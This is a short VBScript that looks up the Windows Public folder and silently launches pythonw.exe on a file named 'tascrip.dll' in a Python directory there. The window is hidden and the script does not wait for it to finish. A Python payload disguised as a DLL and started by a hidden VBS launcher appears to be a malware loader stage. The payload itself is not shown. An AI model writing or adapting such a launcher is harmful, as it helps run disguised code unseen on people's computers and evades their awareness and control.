Dim objShell, objFSO, PublicPath, FullDLLPath, FullPythonPath
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
PublicPath = objShell.ExpandEnvironmentStrings("%PUBLIC%")

Dim DLLPath
DLLPath = "Python\Scripts\tascrip.dll"

Dim PythonPath
PythonPath = "Python\pythonw.exe"

FullDLLPath = PublicPath & "\" & DLLPath
FullPythonPath = PublicPath & "\" & PythonPath

objShell.Run """" & FullPythonPath & """ """ & FullDLLPath & """", 0, False
